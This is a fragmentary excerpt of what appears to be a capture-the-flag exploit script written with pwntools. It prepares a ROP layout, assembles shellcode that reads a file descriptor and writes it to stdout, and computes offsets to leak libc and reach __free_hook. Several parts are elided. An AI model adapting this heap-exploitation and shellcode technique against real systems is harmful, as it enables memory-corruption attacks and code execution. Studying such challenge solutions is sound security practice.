...
def prepare_rop():
    with context.local(endian='big'):
        header = p16(0x0000)
        addr = libc.address + 0x5b1000
        rsp = libc.address + 0x5b1000 + 0x200
    ...
    code += swap(asm(#shellcraft.amd64.linux.cat('./flag')
                     ...
                     shellcraft.amd64.linux.read(3,rsp+0x200,0x18)+
                     shellcraft.amd64.linux.write(1,rsp+0x200,0x18)
                     )) # shellcode
...
# leak libc
off = (-0x10 - 0x5b1000 + 0x3c5710 + 2) / 2
...
off = (-0x10 - 0x5b1000 + libc.symbols['__free_hook'] - libc.address + 2) / 2
off = 0x10000000000000000 + off
